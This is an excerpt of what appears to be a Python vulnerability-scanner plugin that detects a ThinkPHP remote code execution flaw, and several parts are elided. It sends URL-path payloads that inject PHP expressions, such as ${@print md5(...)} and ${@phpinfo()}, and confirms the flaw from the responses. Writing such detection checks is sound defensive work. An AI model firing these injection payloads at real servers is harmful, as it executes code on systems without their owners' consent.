...
class ThinkphpVuls:
    ...
    def audit(self):
        try:
            ...
            if needurl:
                response,content=requestUrl(self.http,needurl+"/index.php/module/aciton/param1/$%7B@print%20md5(NVS_SERVER_TEST_THINKPHP)%7D",self.task_id,self.domain_id)
                if content.find("d7ffe7b0c7265a42b27c62b5ef5a974a")>=0:
                    ...
                    request=getRequest(needurl+"/index.php/module/aciton/param1/$%7B@print(NVS_TEST_THINKPHP)%7D",'GET')
                    ...
                    response,content=requestUrl(self.http,needurl+"/index.php/module/aciton/param1/$%7B@phpinfo()%7D",self.task_id,self.domain_id)
                    if content.find("<title>phpinfo()</title>")>=0 and content2.find("<title>phpinfo()</title>")<0:
                        ...
                        request=getRequest(needurl+"/index.php/module/aciton/param1/$%7B@phpinfo()%7D",'GET')
                        response=getResponse(response,"")
                        self.ob['status']="1"
                        result.append(getRecord(self.ob,needurl,self.ob['level'],detail,request,response))
            return result
            ...
            logging.getLogger().error("File:ThinkPHPExcuteVuls.py, audit function :" + str(e) + ",task id:" + self.task_id + ", domain id:" + self.domain_id + ", url:" + needurl)
            return []
def run_url(http,ob,item):
    try:
        ...
        logging.getLogger().error("File:ThinkPHPExcuteVuls.py, run_url function :" + str(e) + ",task id:" + ob['task_id'] + ", domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:ThinkPHPExcuteVuls.py, run_url function :" + str(e))
        return []     
